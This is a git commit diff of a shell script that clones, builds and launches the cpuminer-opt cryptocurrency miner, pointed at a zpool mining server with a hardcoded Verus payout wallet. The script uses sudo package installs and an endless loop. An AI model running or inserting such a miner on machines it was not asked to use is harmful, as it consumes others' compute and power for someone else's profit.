a9b0038fa3eb8cfee5fc97de96c6d587dabf87e3
ferity1102 <92764631+ferity1102@users.noreply.github.com>
2022-03-27 10:46:57 +0700

    Update vrsc.sh

--- vrsc.sh
+++ vrsc.sh
@@ -1,6 +1,9 @@
 #!/bin/sh
-wget https://github.com/JayDDee/cpuminer-opt/archive/refs/tags/v3.19.6.tar.gz
-tar xvzf cpuminer-opt-3.19.6.tar.gz
+git clone https://github.com/JayDDee/cpuminer-opt.git
+cd cpuminer-opt
+sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
+sudo apt-get install -y lib32z1-dev
+chmod +x build.sh
 ./build.sh
 ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RAtp3eqwa4eQe1oQh51udKbqekiEhoLjVR -p c=VRSC
 while [ 1 ]; do
